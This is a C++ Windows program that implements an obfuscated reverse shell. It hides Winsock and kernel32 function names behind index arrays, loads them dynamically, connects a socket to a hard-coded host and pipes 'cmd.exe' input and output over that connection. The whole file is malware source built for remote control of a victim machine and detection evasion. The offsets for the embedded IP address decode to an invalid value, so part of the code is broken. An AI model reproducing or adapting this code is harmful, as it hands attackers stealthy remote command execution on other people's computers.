#define _WINSOCK_DEPRECATED_NO_WARNINGS 
#include <winsock2.h> 
#include <stdio.h> 
#include <Windows.h>.
#include <iostream>
#pragma comment(lib, "ws2_32") 


typedef FARPROC(WINAPI* GetProcAddressFunc)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI* LoadLibraryFunc)(LPCSTR);

WSADATA wsaData; // For initializing Winsock.
SOCKET wSock; // Socket for network communication.
struct sockaddr_in hax; // Structure for storing server address.
STARTUPINFO sui; // For process creation.
PROCESS_INFORMATION pi; // For process creation.
typedef SOCKET(WINAPI* WSASocketFunc)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);
using namespace std;


void obfuscation(char* big_string, char* original_string) {
    for (int i = 0; i < strlen(original_string); i++) {
        for (int j = 0; j < strlen(big_string); ++j) {
            if (original_string[i] == big_string[j]) {
                printf("%d,", j);
            }
        }
    }
}

// Function to get the original string from obfuscated indices
string getOriginalString(int offsets[], char* big_string, int sizeof_offset) {
    string empty_string = "";
    for (int i = 0; i < sizeof_offset / 4; ++i) {
        char character = big_string[offsets[i]];
        empty_string += character;
    }
    return empty_string;
}

int main(int argc, char* argv[]) {
    // Define strings and offsets for obfuscation
    char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._123456789";
    char create_process_string[] = "inet_addr";
    char big_numbers[] = "1234567.890";

    int c_p_o[] = { 28, 17, 4, 0, 19, 4, 41, 17, 14, 2, 4, 18, 18, 26 };
    int w_s_o[] = { 48, 44, 26, 44, 19, 0, 17, 19, 20, 15 };
    int w_c_o[] = { 48, 44, 26, 28, 14, 13, 13, 4, 2, 19 };
    int w_soc_offset[] = { 48, 44, 26, 44, 14, 2, 10, 4, 19 };
    int h_t_o[] = { 7, 19, 14, 13, 18 };
    int i_a_o[] = { 8, 13, 4, 19, 53, 0, 3, 3, 17 };
    int w_s_a_o[] = { 48, 44, 26, 44, 14, 2, 10, 4, 19, 26 };
    int w_f_s_o_o[] = { 48, 0, 8, 19, 31, 14, 17, 44, 8, 13, 6, 11, 4, 40, 1, 9, 4, 2, 19 };
    int print_f_offset[] = { 15, 17, 8, 13, 19, 5 };
    int ipaddr_offset[] = { 1, 9, 2, 7, 1, 6, 8, 7, 1, 7, 7, 1 };
    int exe_c_m_d[] = { 2, 12, 3, 52, 4, 23, 4 };
    short port = 80;
    int w_s_2_32lld[] = { 22, 18, 55, 53, 56, 55, 52, 3, 11, 11 };
    int k_renel_32[] = { 10, 4, 17, 13, 4, 11, 56, 55, 52, 3, 11, 11 };

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed with error code: " << WSAGetLastError() << std::endl;
        return 1;
    }

    // Dynamically load the ws2_32.dll library and retrieve function pointers for Winsock functions.
    HMODULE w_s2_32lib = LoadLibraryA(getOriginalString(w_s_2_32lld, big_string, sizeof(w_s_2_32lld)).c_str());
    FARPROC w_sa_St_ar_tup = GetProcAddress(w_s2_32lib, getOriginalString(w_s_o, big_string, sizeof(w_s_o)).c_str());
    FARPROC Connectsaw = GetProcAddress(w_s2_32lib, getOriginalString(w_c_o, big_string, sizeof(w_c_o)).c_str());
    FARPROC wsaSocket = GetProcAddress(w_s2_32lib, getOriginalString(w_soc_offset, big_string, sizeof(w_soc_offset)).c_str());
    FARPROC htonsFunc = GetProcAddress(w_s2_32lib, getOriginalString(h_t_o, big_string, sizeof(h_t_o)).c_str());
    FARPROC inetAddr = GetProcAddress(w_s2_32lib, getOriginalString(i_a_o, big_string, sizeof(i_a_o)).c_str());

    reinterpret_cast<int(WINAPI*)(WORD, LPWSADATA)>(w_sa_St_ar_tup)(MAKEWORD(2, 2), &wsaData);

    string original_ws_2_32_dl_l = getOriginalString(w_s_2_32lld, big_string, sizeof(w_s_2_32lld)).c_str();
    wstring wide_original_ws_2_32_dl_l(original_ws_2_32_dl_l.begin(), original_ws_2_32_dl_l.end());
    HMODULE moduleHandle = GetModuleHandleW(wide_original_ws_2_32_dl_l.c_str());
    WSASocketFunc wsaSocketFunc = reinterpret_cast<WSASocketFunc>(GetProcAddress(moduleHandle, getOriginalString(w_s_a_o, big_string, sizeof(w_s_a_o)).c_str()));

    wSock = wsaSocketFunc(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);

    hax.sin_family = AF_INET;
    hax.sin_port = reinterpret_cast<u_short(__stdcall*)(u_short)>(htonsFunc)(port);
    hax.sin_addr.s_addr = reinterpret_cast<unsigned long(__stdcall*)(const char*)>(inetAddr)(getOriginalString(ipaddr_offset, big_numbers, sizeof(ipaddr_offset)).c_str());

    printf("Attempting to connect to IP: %s, Port: %d\n", inet_ntoa(hax.sin_addr), ntohs(hax.sin_port));

    if (reinterpret_cast<int(WINAPI*)(SOCKET, const struct sockaddr*, int, LPWSABUF, LPWSABUF, LPQOS, LPQOS, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE)>(
        Connectsaw)(wSock, reinterpret_cast<const sockaddr*>(&hax), sizeof(hax), nullptr, nullptr, nullptr, nullptr, nullptr, nullptr) == 0) {
        printf("\nit's working\n");
    }
    else {
        printf("Error: 0x%x\n", GetLastError());
    }

    // Dynamically load kernel32.dll and execute the reverse shell
    FARPROC createProcess = GetProcAddress(LoadLibraryA(getOriginalString(k_renel_32, big_string, sizeof(k_renel_32)).c_str()), getOriginalString(c_p_o, big_string, sizeof(c_p_o)).c_str());
    FARPROC waitForSingleObject = GetProcAddress(LoadLibraryA(getOriginalString(k_renel_32, big_string, sizeof(k_renel_32)).c_str()), getOriginalString(w_f_s_o_o, big_string, sizeof(w_f_s_o_o)).c_str());

    STARTUPINFOA sui;
    PROCESS_INFORMATION pi;
    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock;

    char* command = (char*)getOriginalString(exe_c_m_d, big_string, sizeof(exe_c_m_d)).c_str();

    if (CreateProcessA(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi)) {
        printf("Now launching shell...\n");
    }
    else {
        printf("CreateProcess failed\n");
    }

    WSACleanup();
    return 0;
}
